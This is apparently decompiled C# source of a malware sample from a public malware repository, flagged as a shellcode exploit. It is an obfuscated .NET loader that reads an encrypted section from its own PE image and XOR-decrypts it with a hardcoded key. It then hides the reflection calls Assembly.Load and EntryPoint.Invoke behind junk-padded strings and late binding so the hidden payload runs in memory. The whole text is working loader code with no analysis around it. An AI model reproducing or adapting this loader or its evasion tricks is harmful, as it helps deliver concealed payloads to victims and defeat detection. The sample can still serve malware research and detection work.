// Decompiled with JetBrains decompiler
// Type: 730407010237
// Assembly: 942981470147, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 92EB186D-EC33-4501-B5FF-A65C9233BC32
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Exploit.MSIL.Shellcode.gen-f8bb0d6e016074f6759f74d8950983793a87aec3cd6d56569fa8809d5c55396a.exe

using \u003432388962105;
using Microsoft.VisualBasic;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

public class \u003730407010237
{
  public static unsafe void \u003551675351539()
  {
    \u003859629081730.\u003C390622397953\u003E();
    "PRIYATNO".ToString();
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(typeof (\u003730407010237).Module);
    byte* numPtr1 = hinstance + *(uint*) (hinstance + 60);
    uint num1 = *(short*) (numPtr1 + 24) != (short) 523 ? *(uint*) (numPtr1 + 168) : *(uint*) (numPtr1 + 184);
    byte* numPtr2 = hinstance + num1;
    int length = (int) *(uint*) (numPtr2 + 16);
    uint num2 = *(uint*) (numPtr2 + 20);
    byte* numPtr3 = numPtr2 - num1;
    byte[] numArray = new byte[length];
    byte* numPtr4 = numPtr3 + num2;
    fixed (byte* numPtr5 = &numArray[0])
    {
      for (int index = 0; index < numArray.Length; ++index)
        numPtr5[index] = numPtr4[index];
    }
    \u003730407010237.\u003C099271488570\u003E(\u003730407010237.\u003C601711965465\u003E(numArray, "116074618294"));
  }

  [CompilerGenerated]
  public static void \u003C099271488570\u003E(byte[] _param0)
  {
    object obj1 = (object) string.Empty;
    foreach (string str1 in \u003730407010237.\u003C653552209181\u003E())
    {
      string empty1 = string.Empty;
      string empty2 = string.Empty;
      string str2 = str1.Replace("Bare", empty2).Replace("Metal", string.Empty);
      object obj2 = obj1;
      string str3 = str2;
      int num = str2.StartsWith("I") ? 1 : 2;
      object[] objArray;
      if (!str2.StartsWith('L'.ToString()))
      {
        if (!str2.StartsWith('I'.ToString()))
          objArray = (object[]) null;
        else
          objArray = new object[2]{ (object) false, null };
      }
      else
        objArray = new object[1]{ (object) _param0 };
      // ISSUE: reference to a compiler-generated field
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      obj1 = __calli((__FnPtr<object (object, string, CallType, object[])>) \u003302295231489.\u003308556210152.\u003684499846223.\u003941453285048[0])((object[]) obj2, (CallType) str3, (string) num, (object) objArray);
    }
  }

  [CompilerGenerated]
  public static List<string> \u003C653552209181\u003E() => new List<string>()
  {
    "GetBareTypeMetal",
    "BareAsseMetalmbly",
    "MetalLoBaread",
    "MetalEntryBarePoint",
    "MetalInBarevoke"
  };

  [CompilerGenerated]
  public static byte[] \u003C601711965465\u003E(byte[] _param0, string _param1)
  {
    byte[] numArray = new byte[_param0.Length];
    for (int index = 0; index < _param0.Length; ++index)
      numArray[index] = (byte) ((uint) _param0[index] ^ (uint) _param1[index % _param1.Length]);
    return numArray;
  }
}
